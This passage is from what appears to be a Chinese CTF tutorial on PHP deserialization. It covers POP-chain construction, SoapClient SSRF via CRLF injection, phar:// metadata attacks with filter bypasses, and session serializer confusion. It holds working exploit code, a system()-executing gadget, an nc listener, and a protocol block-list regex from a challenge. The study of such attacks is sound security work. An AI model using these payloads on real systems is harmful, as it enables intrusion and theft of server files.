<span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="o">=</span><span class="s1">&#39;index.php&#39;</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
        <span class="k">echo</span> <span class="s1">&#39;Welcome to &#39;</span><span class="o">.</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__toString</span><span class="p">(){</span>
        <span class="k">return</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">if</span><span class="p">(</span><span class="nb">preg_match</span><span class="p">(</span><span class="s2">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span><span class="p">,</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span><span class="p">))</span> <span class="p">{</span>
            <span class="k">echo</span> <span class="s2">&quot;hacker&quot;</span><span class="p">;</span>
            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="s2">&quot;index.php&quot;</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">array</span><span class="p">();</span>
    <span class="p">}</span>

    <span class="k">public</span> <span class="k">function</span> <span class="fm">__get</span><span class="p">(</span><span class="nv">$key</span><span class="p">){</span>
        <span class="nv">$function</span> <span class="o">=</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span><span class="p">;</span>
        <span class="k">return</span> <span class="nv">$function</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>这里我直接说利用思路，首先逆向分析，我们最终是希望通过<code>Modifier</code>当中的<code>append</code>方法实现本地文件包含读取文件，回溯到调用它的<code>__invoke</code>，当我们<code>将对象调用为函数时触发</code>,发现在<code>Test</code>类当中的<code>__get</code>方法，再回溯到<code>Show</code>当中的<code>__toString</code>，再回溯到<code>Show</code>当中的<code>__construct</code>当中有<code>echo $this-&gt;source</code>可以调用<code>__toString</code></p>
<p>因此不难构造pop链</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;memory_limit&#39;</span><span class="p">,</span><span class="s1">&#39;-1&#39;</span><span class="p">);</span>
<span class="k">class</span> <span class="nc">Modifier</span> <span class="p">{</span>
    <span class="k">protected</span>  <span class="nv">$var</span> <span class="o">=</span> <span class="s1">&#39;php://filter/read=convert.base64-encode/resource=flag.php&#39;</span><span class="p">;</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Show</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$source</span><span class="p">;</span>
    <span class="k">public</span> <span class="nv">$str</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(</span><span class="nv">$file</span><span class="p">){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">source</span> <span class="o">=</span> <span class="nv">$file</span><span class="p">;</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">str</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="k">class</span> <span class="nc">Test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$p</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">(){</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">p</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Modifier</span><span class="p">();</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">(</span><span class="s1">&#39;aaa&#39;</span><span class="p">);</span>
<span class="nv">$a</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Show</span><span class="p">(</span><span class="nv">$a</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">serialize</span><span class="p">(</span><span class="nv">$a</span><span class="p">));</span>
</pre></div>

<h2 id="php_2">PHP原生类反序列化利用<a class="headerlink" href="#php_2" title="Permanent link">&para;</a></h2>
<h3 id="soapclient">SoapClient介绍<a class="headerlink" href="#soapclient" title="Permanent link">&para;</a></h3>
<blockquote>
<p>综述： </p>
<p>php在安装php-soap拓展后，可以反序列化原生类SoapClient，来发送http post请求。</p>
<p>必须调用SoapClient不存在的方法，触发SoapClient的__call魔术方法。</p>
<p>通过CRLF来添加请求体：SoapClient可以指定请求的user-agent头，通过添加换行符的形式来加入其他请求内容</p>
</blockquote>
<p>SoapClient采用了HTTP作为底层通讯协议，XML作为数据传送的格式，其采用了SOAP协议(<em>SOAP</em> 是一种简单的基于 XML 的协议,它使应用程序通过 HTTP 来交换信息)，其次我们知道某个实例化的类，如果去调用了一个不存在的函数，会去调用<code>__call</code>方法，具体详细的信息大家可以去搜索引擎看看，这里不再赘述</p>
<h3 id="_9">利用方式<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>下面首先在我的VPS上面开启监听<code>nc -lvvp 9328</code></p>
<div class="codehilite"><pre><span></span>&lt;?php
$a = new SoapClient(null,array(&#39;uri&#39;=&gt;&#39;bbb&#39;, &#39;location&#39;=&gt;&#39;http://xxxx.xxx.xx:9328&#39;));
$b = serialize($a);
$c = unserialize($b);
$c -&gt; not_a_function();//调用不存在的方法，让SoapClient调用__call
</pre></div>

<p>运行上面的php程序，在我的vps上面奖会捕获监听</p>
<p><img alt="" src="6.png" /></p>
<p>从上面这张图可以看到，<code>SOAPAction</code>处是我们的可控参数，因此我们可以尝试注入我们自己恶意构造的<strong>CRLF</strong>即插入<strong>\r\n</strong>，利用成功！</p>
<p><img alt="" src="7.png" /></p>
<p>但是还有个问题我们再发送POST数据的时候是需要遵循HTTP协议，指定请求头<strong>Content-Type: application/x-www-form-urlencoded</strong>但<strong>Content-Type</strong>在<strong>SOAPAction</strong>的上面，就无法控制<strong>Content-Type</strong>,也就不能控制POST的数据</p>
<p>接下来我们实验一下</p>
<p><img alt="" src="8.png" /></p>
<h3 id="_10">实战<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<p>反序列化我们传入的<strong>vip</strong>执行getFlag函数(迷惑人的函数)</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nb">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
<span class="nv">$vip</span> <span class="o">=</span> <span class="nb">unserialize</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;vip&#39;</span><span class="p">]);</span>
<span class="nv">$vip</span><span class="o">-&gt;</span><span class="na">getFlag</span><span class="p">();</span>
<span class="c1">//flag.php</span>
<span class="nv">$xff</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;,&#39;</span><span class="p">,</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;HTTP_X_FORWARDED_FOR&#39;</span><span class="p">]);</span>
<span class="nb">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
<span class="nv">$ip</span> <span class="o">=</span> <span class="nb">array_pop</span><span class="p">(</span><span class="nv">$xff</span><span class="p">);</span>
<span class="nx">​</span>
<span class="nx">​</span>
<span class="k">if</span><span class="p">(</span><span class="nv">$ip</span><span class="o">!==</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">){</span>
    <span class="k">die</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">);</span>
<span class="p">}</span><span class="k">else</span><span class="p">{</span>
    <span class="nv">$token</span> <span class="o">=</span> <span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;token&#39;</span><span class="p">];</span>
    <span class="k">if</span><span class="p">(</span><span class="nv">$token</span><span class="o">==</span><span class="s1">&#39;ctfshow&#39;</span><span class="p">){</span>
        <span class="nb">file_put_contents</span><span class="p">(</span><span class="s1">&#39;flag.txt&#39;</span><span class="p">,</span><span class="nv">$flag</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>由于服务器带有cloudfare代理，我们无法通过本地构造XFF头实现绕过，我们需要使用SoapClient与CRLF实现SSRF访问<code>127.0.0.1/flag.php</code>,即可绕过cloudfare代理</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="nv">$target</span> <span class="o">=</span> <span class="s1">&#39;http://127.0.0.1/flag.php&#39;</span><span class="p">;</span>
<span class="nv">$post_string</span> <span class="o">=</span> <span class="s1">&#39;token=ctfshow&#39;</span><span class="p">;</span>
<span class="nv">$headers</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span>
    <span class="s1">&#39;X-Forwarded-For: 127.0.0.1,127.0.0.1&#39;</span><span class="p">,</span>
    <span class="s1">&#39;UM_distinctid:175648cc09a7ae-050bc162c95347-32667006-13c680-175648cc09b69d&#39;</span>
<span class="p">);</span>
<span class="nv">$b</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">SoapClient</span><span class="p">(</span><span class="k">null</span><span class="p">,</span><span class="k">array</span><span class="p">(</span><span class="s1">&#39;location&#39;</span> <span class="o">=&gt;</span> <span class="nv">$target</span><span class="p">,</span><span class="s1">&#39;user_agent&#39;</span><span class="o">=&gt;</span><span class="s1">&#39;y4tacker^^Content-Type: application/x-www-form-urlencoded^^&#39;</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s1">&#39;^^&#39;</span><span class="p">,</span><span class="nv">$headers</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;^^Content-Length: &#39;</span><span class="o">.</span><span class="p">(</span><span class="nx">string</span><span class="p">)</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$post_string</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;^^^^&#39;</span><span class="o">.</span><span class="nv">$post_string</span><span class="p">,</span><span class="s1">&#39;uri&#39;</span> <span class="o">=&gt;</span> <span class="s2">&quot;aaab&quot;</span><span class="p">));</span>
<span class="nv">$aaa</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">(</span><span class="nv">$b</span><span class="p">);</span>
<span class="nv">$aaa</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;^^&#39;</span><span class="p">,</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
<span class="nv">$aaa</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="s1">&#39;&amp;&#39;</span><span class="p">,</span><span class="nv">$aaa</span><span class="p">);</span>
<span class="k">echo</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$aaa</span><span class="p">);</span>
</pre></div>

<p>接下来访问<code>flag.txt</code>即可</p>
<h2 id="phar">Phar反序列化<a class="headerlink" href="#phar" title="Permanent link">&para;</a></h2>
<p>phar文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的meta-data。当受影响的文件操作函数调用phar文件时，会自动反序列化meta-data内的内容。</p>
<h3 id="phar_1">什么是phar文件<a class="headerlink" href="#phar_1" title="Permanent link">&para;</a></h3>
<p>在软件中，PHAR（PHP归档）文件是一种打包格式，通过将许多PHP代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p>
<p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如(fopen(),copy(),file_exists()和filesize()。 phar://就是一种内置的流包装器。</p>
<p>php中一些常见的流包装器如下：</p>
<div class="codehilite"><pre><span></span><span class="x">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span>
<span class="x">http:// — 访问 HTTP(s) 网址</span>
<span class="x">ftp:// — 访问 FTP(s) URLs</span>
<span class="x">php:// — 访问各个输入/输出流（I/O streams）</span>
<span class="x">zlib:// — 压缩流</span>
<span class="x">data:// — 数据（RFC 2397）</span>
<span class="x">glob:// — 查找匹配的文件路径模式</span>
<span class="x">phar:// — PHP 归档</span>
<span class="x">ssh2:// — Secure Shell 2</span>
<span class="x">rar:// — RAR</span>
<span class="x">ogg:// — 音频流</span>
<span class="x">expect:// — 处理交互式的流</span>
</pre></div>

<h3 id="phar_2">phar文件的结构<a class="headerlink" href="#phar_2" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><span class="x">stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</span>
<span class="x">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span>
<span class="x">content:被压缩文件的内容</span>
<span class="x">signature (可空):签名，放在末尾。</span>
</pre></div>

<p>如何生成一个phar文件？下面给出一个参考例子</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
    <span class="k">class</span> <span class="nc">Test</span> <span class="p">{</span>
    <span class="p">}</span>

    <span class="o">@</span><span class="nb">unlink</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span>
    <span class="nv">$phar</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Phar</span><span class="p">(</span><span class="s2">&quot;phar.phar&quot;</span><span class="p">);</span> <span class="c1">//后缀名必须为phar</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">startBuffering</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setStub</span><span class="p">(</span><span class="s2">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span><span class="p">);</span> <span class="c1">//设置stub</span>
    <span class="nv">$o</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Test</span><span class="p">();</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">setMetadata</span><span class="p">(</span><span class="nv">$o</span><span class="p">);</span> <span class="c1">//将自定义的meta-data存入manifest</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">addFromString</span><span class="p">(</span><span class="s2">&quot;test.txt&quot;</span><span class="p">,</span> <span class="s2">&quot;test&quot;</span><span class="p">);</span> <span class="c1">//添加要压缩的文件</span>
    <span class="c1">//签名自动计算</span>
    <span class="nv">$phar</span><span class="o">-&gt;</span><span class="na">stopBuffering</span><span class="p">();</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_11">漏洞利用条件<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h3>
<ol>
<li>phar文件要能够上传到服务器端。</li>
<li>要有可用的魔术方法作为“跳板”。</li>
<li>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</li>
</ol>
<h3 id="_12">受影响的函数<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h3>
<p>知道创宇测试后受影响的函数列表：</p>
<p><img alt="" src="9.png" /></p>
<p>实际上不止这些，也可以参考这篇链接，里面有详细说明https://blog.zsxsoft.com/post/38</p>
<p>当然为了阅读方便，这里便把它整理过来</p>
<div class="codehilite"><pre><span></span><span class="x">//exif</span>
<span class="x">exif_thumbnail</span>
<span class="x">exif_imagetype</span>

<span class="x">//gd</span>
<span class="x">imageloadfont</span>
<span class="x">imagecreatefrom***系列函数</span>

<span class="x">//hash</span>

<span class="x">hash_hmac_file</span>
<span class="x">hash_file</span>
<span class="x">hash_update_file</span>
<span class="x">md5_file</span>
<span class="x">sha1_file</span>

<span class="x">// file/url</span>
<span class="x">get_meta_tags</span>
<span class="x">get_headers</span>

<span class="x">//standard </span>
<span class="x">getimagesize</span>
<span class="x">getimagesizefromstring</span>

<span class="x">// zip   </span>
<span class="x">$zip = new ZipArchive();</span>
<span class="x">$res = $zip-&gt;open(&#39;c.zip&#39;);</span>
<span class="x">$zip-&gt;extractTo(&#39;phar://test.phar/test&#39;);</span>
<span class="x">// Bzip / Gzip 当环境限制了phar不能出现在前面的字符里。可以使用compress.bzip2://和compress.zlib://绕过</span>
<span class="x">$z = &#39;compress.bzip2://phar:///home/sx/test.phar/test.txt&#39;;</span>
<span class="x">$z = &#39;compress.zlib://phar:///home/sx/test.phar/test.txt&#39;;</span>

<span class="x">//配合其他协议：(SUCTF)</span>
<span class="x">//https://www.xctf.org.cn/library/details/17e9b70557d94b168c3e5d1e7d4ce78f475de26d/</span>
<span class="x">//当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。</span>
<span class="x">//php://filter/read=convert.base64-encode/resource=phar://phar.phar</span>

<span class="x">//Postgres pgsqlCopyToFile和pg_trace同样也是能使用的，需要开启phar的写功能。</span>
<span class="cp">&lt;?php</span>
    <span class="nv">$pdo</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">PDO</span><span class="p">(</span><span class="nb">sprintf</span><span class="p">(</span><span class="s2">&quot;pgsql:host=%s;dbname=%s;user=%s;password=%s&quot;</span><span class="p">,</span> <span class="s2">&quot;127.0.0.1&quot;</span><span class="p">,</span> <span class="s2">&quot;postgres&quot;</span><span class="p">,</span> <span class="s2">&quot;sx&quot;</span><span class="p">,</span> <span class="s2">&quot;123456&quot;</span><span class="p">));</span>
    <span class="o">@</span><span class="nv">$pdo</span><span class="o">-&gt;</span><span class="na">pgsqlCopyFromFile</span><span class="p">(</span><span class="s1">&#39;aa&#39;</span><span class="p">,</span> <span class="s1">&#39;phar://phar.phar/aa&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>

<span class="x">// Mysql</span>
<span class="x">//LOAD DATA LOCAL INFILE也会触发这个php_stream_open_wrapper</span>
<span class="x">//配置一下mysqld:</span>
<span class="x">//[mysqld]</span>
<span class="x">//local-infile=1</span>
<span class="x">//secure_file_priv=&quot;&quot;</span>

<span class="cp">&lt;?php</span>
<span class="k">class</span> <span class="nc">A</span> <span class="p">{</span>
    <span class="k">public</span> <span class="nv">$s</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="p">;</span>
    <span class="k">public</span> <span class="k">function</span> <span class="fm">__wakeup</span> <span class="p">()</span> <span class="p">{</span>
        <span class="nb">system</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">s</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="nv">$m</span> <span class="o">=</span> <span class="nx">mysqli_init</span><span class="p">();</span>
<span class="nx">mysqli_options</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="nx">MYSQLI_OPT_LOCAL_INFILE</span><span class="p">,</span> <span class="k">true</span><span class="p">);</span>
<span class="nv">$s</span> <span class="o">=</span> <span class="nx">mysqli_real_connect</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="s1">&#39;localhost&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span> <span class="s1">&#39;testtable&#39;</span><span class="p">,</span> <span class="mi">3306</span><span class="p">);</span>
<span class="nv">$p</span> <span class="o">=</span> <span class="nx">mysqli_query</span><span class="p">(</span><span class="nv">$m</span><span class="p">,</span> <span class="s1">&#39;LOAD DATA LOCAL INFILE \&#39;phar://test.phar/test\&#39; INTO TABLE a  LINES TERMINATED BY \&#39;\r\n\&#39;  IGNORE 1 LINES;&#39;</span><span class="p">);</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<h3 id="_13">绕过方式<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h3>
<p>当环境限制了phar不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p>
<div class="codehilite"><pre><span></span><span class="x">compress.bzip://phar:///test.phar/test.txt</span>
<span class="x">compress.bzip2://phar:///test.phar/test.txt</span>
<span class="x">compress.zlib://phar:///home/sx/test.phar/test.txt</span>
<span class="x">php://filter/resource=phar:///test.phar/test.txt</span>
</pre></div>

<p>当环境限制了phar不能出现在前面的字符里，还可以配合其他协议进行利用。
php://filter/read=convert.base64-encode/resource=phar://phar.phar</p>
<p>GIF格式验证可以通过在文件头部添加GIF89a绕过
1、$phar-&gt;setStub("GIF89a"."&lt;?php __HALT_COMPILER(); ?&gt;"); //设置stub
2、生成一个phar.phar，修改后缀名为phar.gif</p>
<h2 id="php-session">php-session反序列化<a class="headerlink" href="#php-session" title="Permanent link">&para;</a></h2>
<h3 id="session">session简单介绍<a class="headerlink" href="#session" title="Permanent link">&para;</a></h3>
<p>在计算机中，尤其是在网络应用中，称为“会话控制”。Session 对象存储特定用户会话所需的属性及配置信息。这样，当用户在应用程序的 Web 页之间跳转时，存储在 Session 对象中的变量将不会丢失，而是在整个用户会话中一直存在下去。当用户请求来自应用程序的 Web 页时，如果该用户还没有会话，则 Web 服务器将自动创建一个 Session 对象。当会话过期或被放弃后，服务器将终止该会话。</p>
<p>当第一次访问网站时，Seesion_start()函数就会创建一个唯一的Session ID，并自动通过HTTP的响应头，将这个Session ID保存到客户端Cookie中。同时，也在服务器端创建一个以Session ID命名的文件，用于保存这个用户的会话信息。当同一个用户再次访问这个网站时，也会自动通过HTTP的请求头将Cookie中保存的Seesion ID再携带过来，这时Session_start()函数就不会再去分配一个新的Session ID，而是在服务器的硬盘中去寻找和这个Session ID同名的Session文件，将这之前为这个用户保存的会话信息读出，在当前脚本中应用，达到跟踪这个用户的目的。</p>
<h3 id="session_1">session 的存储机制<a class="headerlink" href="#session_1" title="Permanent link">&para;</a></h3>
<p>php中的session中的内容并不是放在内存中的，而是以文件的方式来存储的，存储方式就是由配置项session.save_handler来进行确定的，默认是以文件的方式存储。
存储的文件是以sess_sessionid来进行命名的</p>
<table>
<thead>
<tr>
<th>php_serialize</th>
<th>经过serialize()函数序列化数组</th>
</tr>
</thead>
<tbody>
<tr>
<td>php</td>
<td>键名+竖线+经过serialize()函数处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td>键名的长度对应的ascii字符+键名+serialize()函数序列化的值</td>
</tr>
</tbody>
</table>
<h3 id="phpinisession">php.ini中一些session配置<a class="headerlink" href="#phpinisession" title="Permanent link">&para;</a></h3>
<blockquote>
<p>session.save_path="" --设置session的存储路径
session.save_handler=""--设定用户自定义存储函数，如果想使用PHP内置会话存储机制之外的可以使用本函数(数据库等方式)
session.auto_start boolen--指定会话模块是否在请求开始时启动一个会话默认为0不启动
session.serialize_handler string--定义用来序列化/反序列化的处理器名字。默认使用php</p>
</blockquote>
<h3 id="_14">利用姿势<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h3>
<h4 id="sessionupload_progress">session.upload_progress进行文件包含和反序列化渗透<a class="headerlink" href="#sessionupload_progress" title="Permanent link">&para;</a></h4>
<p>这篇文章说的很详细了，没必要班门弄斧</p>
<p><a href="https://www.freebuf.com/vuls/202819.html">https://www.freebuf.com/vuls/202819.html</a></p>
<h4 id="session_2">使用不同的引擎来处理session文件<a class="headerlink" href="#session_2" title="Permanent link">&para;</a></h4>
<h5 id="_session">$_SESSION变量直接可控<a class="headerlink" href="#_session" title="Permanent link">&para;</a></h5>
<p>php引擎的存储格式是<code>键名|serialized_string</code>，而php_serialize引擎的存储格式是<code>serialized_string</code>。如果程序使用两个引擎来分别处理的话就会出现问题</p>
<p>来看看这两个php</p>
<div class="codehilite"><pre><span></span><span class="x">// 1.php</span>
<span class="cp">&lt;?php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php_serialize&#39;</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;y4&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
<span class="nb">var_dump</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">);</span>
<span class="c1">//2.php</span>
<span class="o">&lt;?</span><span class="nx">php</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">test</span><span class="p">{</span>
    <span class="k">public</span> <span class="nv">$name</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__wakeup</span><span class="p">(){</span>
        <span class="k">echo</span> <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">name</span><span class="p">;</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></div>

<p>首先访问1.php，传入参数<code>a=|O:4:"test":1:{s:4:"name";s:8:"y4tacker";}</code>再访问2.php，注意不要忘记<code>|</code></p>
<p><img alt="" src="10.png" /></p>
<p>由于<code>1.php</code>是使用<code>php_serialize</code>引擎处理，因此只会把<code>'|'</code>当做一个正常的字符。然后访问<code>2.php</code>，由于用的是<code>php</code>引擎，因此遇到<code>'|'</code>时会将之看做键名与值的分割符，从而造成了歧义，导致其在解析session文件时直接对<code>'|'</code>后的值进行反序列化处理。</p>
<p>这里可能会有一个小疑问，为什么在解析session文件时直接对<code>'|'</code>后的值进行反序列化处理，这也是处理器的功能？这个其实是因为<code>session_start()</code>这个函数，可以看下官方说明：</p>
<blockquote>
<p>当会话自动开始或者通过 <strong>session_start()</strong> 手动开始的时候， PHP 内部会调用会话管理器的 open 和 read 回调函数。 会话管理器可能是 PHP 默认的， 也可能是扩展提供的（SQLite 或者 Memcached 扩展）， 也可能是通过 <a href="https://www.php.net/manual/zh/function.session-set-save-handler.php">session_set_save_handler()</a> 设定的用户自定义会话管理器。 <strong>通过 read 回调函数返回的现有会话数据</strong>（使用特殊的序列化格式存储），<strong>PHP 会自动反序列化数据并且填充 $_SESSION 超级全局变量</strong></p>
</blockquote>
<p>因此我们成功触发了<code>test</code>类中的<code>__wakeup()</code>方法,所以这种攻击思路是可行的。但这种方法是在可以对<code>session</code>的进行赋值的，那如果代码中不存在对<code>$_SESSION</code>变量赋值的情况下又该如何利用</p>
<h5 id="_session_1">$_SESSION变量直接不可控<a class="headerlink" href="#_session_1" title="Permanent link">&para;</a></h5>
<p>我们来看高校战疫的一道CTF题目</p>
<div class="codehilite"><pre><span></span><span class="cp">&lt;?php</span>
<span class="c1">//A webshell is wait for you</span>
<span class="nb">ini_set</span><span class="p">(</span><span class="s1">&#39;session.serialize_handler&#39;</span><span class="p">,</span> <span class="s1">&#39;php&#39;</span><span class="p">);</span>
<span class="nb">session_start</span><span class="p">();</span>
<span class="k">class</span> <span class="nc">OowoO</span>
<span class="p">{</span>
    <span class="k">public</span> <span class="nv">$mdzz</span><span class="p">;</span>
    <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span> <span class="o">=</span> <span class="s1">&#39;phpinfo();&#39;</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">function</span> <span class="fm">__destruct</span><span class="p">()</span>
    <span class="p">{</span>
        <span class="k">eval</span><span class="p">(</span><span class="nv">$this</span><span class="o">-&gt;</span><span class="na">mdzz</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
<span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;phpinfo&#39;</span><span class="p">]))</span>
<span class="p">{</span>
    <span class="nv">$m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">OowoO</span><span class="p">();</span>
<span class="p">}</span>
<span class="k">else</span>
<span class="p">{</span>
    <span class="nb">highlight_string</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;index.php&#39;</span><span class="p">));</span>
<span class="p">}</span>
<span class="cp">?&gt;</span><span class="x"></span>
</pre></div>

<p>我们注意到这样一句话<code>ini_set('session.serialize_handler', 'php');</code>，因此不难猜测本身在<code>php.ini</code>当中的设置可能是<code>php_serialize</code>，在查看了<code>phpinfo</code>后得证猜测正确，也知道了这道题的考点</p>
<p>那么我们就进入phpinfo查看一下，enabled=on表示upload_progress功能开始，也意味着当浏览器向服务器上传一个文件时，php将会把此次文件上传的详细信息(如上传时间、上传进度等)存储在session当中 ；只需往该地址任意 POST 一个名为 PHP_SESSION_UPLOAD_PROGRESS 的字段，就可以将filename的值赋值到session中</p>
<p><img alt="" src="11.png" /></p>
<p>构造文件上传的表单</p>
